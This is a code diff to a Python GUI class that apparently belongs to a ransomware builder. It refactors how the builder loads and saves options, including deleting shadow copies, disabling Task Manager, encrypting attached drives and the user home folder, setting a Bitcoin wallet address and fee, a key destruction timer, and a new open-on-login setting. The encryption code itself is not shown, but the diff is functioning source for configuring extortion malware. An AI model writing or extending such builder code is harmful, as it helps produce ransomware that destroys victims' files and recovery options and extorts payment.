@@ -113,6 +113,21 @@ class Gui(MainFrame):
             self.UpxDirPicker.SetPath(config_dict["upx_dir"])
         else:
             self.UpxDirPicker.SetPath("")
+        # Open GUI On Login
+        if "open_gui_on_login" in config_dict:
+            self.OpenGuiOnLoginCheckbox.SetValue(config_dict["open_gui_on_login"])
+        else:
+            self.OpenGuiOnLoginCheckbox.SetValue(BUILDER_CONFIG_ITEMS["open_gui_on_login"]["default"])
+        # Delete Shadow Copies
+        if "delete_shadow_copies" in config_dict:
+            self.DeleteShadowCopiesCheckbox.SetValue(config_dict["delete_shadow_copies"])
+        else:
+            self.DeleteShadowCopiesCheckbox.SetValue(BUILDER_CONFIG_ITEMS["delete_shadow_copies"]["default"])
+        # Disable Task Manager
+        if "disable_task_manager" in config_dict:
+            self.DisableTaskManagerCheckbox.SetValue(config_dict["disable_task_manager"])
+        else:
+            self.DisableTaskManagerCheckbox.SetValue(BUILDER_CONFIG_ITEMS["disable_task_manager"]["default"])
         # GUI Title
         if "gui_title" in config_dict:
             self.GuiTitleTextCtrl.SetValue(config_dict["gui_title"])
@@ -123,18 +138,6 @@ class Gui(MainFrame):
             self.KeyDestructionTimeTextCtrl.SetValue(config_dict["key_destruction_time"])
         else:
             self.KeyDestructionTimeTextCtrl.SetValue("")
-        # Delete Shadow Copies
-        if "delete_shadow_copies" in config_dict:
-            if config_dict["delete_shadow_copies"]:
-                self.DeleteShadowCopiesCheckbox.SetValue(True)
-            else:
-                self.DeleteShadowCopiesCheckbox.SetValue(BUILDER_CONFIG_ITEMS["delete_shadow_copies"]["default"])
-        # Disable Task Manager
-        if "disable_task_manager" in config_dict:
-            if config_dict["disable_task_manager"]:
-                self.DisableTaskManagerCheckbox.SetValue(True)
-            else:
-                self.DisableTaskManagerCheckbox.SetValue(BUILDER_CONFIG_ITEMS["disable_task_manager"]["default"])
         # Wallet Address
         if "wallet_address" in config_dict:
             self.WalletAddressTextCtrl.SetValue(config_dict["wallet_address"])
@@ -147,16 +150,14 @@ class Gui(MainFrame):
             self.BitcoinFeeTextCtrl.SetValue("")
         # Encrypt Attached Drives
         if "encrypt_attached_drives" in config_dict:
-            if config_dict["encrypt_attached_drives"]:
-                self.EncryptAttachedDrivesCheckbox.SetValue(True)
-            else:
-                self.EncryptAttachedDrivesCheckbox.SetValue(BUILDER_CONFIG_ITEMS["encrypt_attached_drives"]["default"])
+            self.EncryptAttachedDrivesCheckbox.SetValue(config_dict["encrypt_attached_drives"])
+        else:
+            self.EncryptAttachedDrivesCheckbox.SetValue(BUILDER_CONFIG_ITEMS["encrypt_attached_drives"]["default"])
         # Encrypt User Home
         if "encrypt_user_home" in config_dict:
-            if config_dict["encrypt_user_home"]:
-                self.EncryptUserHomeCheckbox.SetValue(True)
-            else:
-                self.EncryptUserHomeCheckbox.SetValue(BUILDER_CONFIG_ITEMS["encrypt_user_home"]["default"])
+            self.EncryptUserHomeCheckbox.SetValue(config_dict["encrypt_user_home"])
+        else:
+            self.EncryptUserHomeCheckbox.SetValue(BUILDER_CONFIG_ITEMS["encrypt_user_home"]["default"])
         # Max file size to encrypt
         if "max_file_size_to_encrypt" in config_dict:
             self.MaxFileSizeTextCtrl.SetValue(config_dict["max_file_size_to_encrypt"])
@@ -176,9 +177,13 @@ class Gui(MainFrame):
         # Make GUI Resizeable
         if "make_gui_resizeable" in config_dict:
             self.MakeGuiResizeableCheckbox.SetValue(config_dict["make_gui_resizeable"])
+        else:
+            self.MakeGuiResizeableCheckbox.SetValue(BUILDER_CONFIG_ITEMS["make_gui_resizeable"]["default"])
         # Always on Top
         if "always_on_top" in config_dict:
             self.AlwaysOnTopCheckbox.SetValue(config_dict["always_on_top"])
+        else:
+            self.AlwaysOnTopCheckbox.SetValue(BUILDER_CONFIG_ITEMS["always_on_top"]["default"])
         if "background_colour" in config_dict:
             self.BackgroundColourPicker.SetColour(wx.Colour(
                     config_dict["background_colour"][0],
@@ -445,6 +450,8 @@ class Gui(MainFrame):
         user_input_dict["pyinstaller_aes_key"] = self.PyInstallerAesKeyTextCtrl.GetValue()
         # Icon FIle
         user_input_dict["icon_file"] = self.IconFilePicker.GetPath()
+        # Open GUI On Login
+        user_input_dict["open_gui_on_login"] = self.OpenGuiOnLoginCheckbox.IsChecked()
         # GUI Title
         user_input_dict["gui_title"] = self.GuiTitleTextCtrl.GetValue()
         # UPX Packer Dir
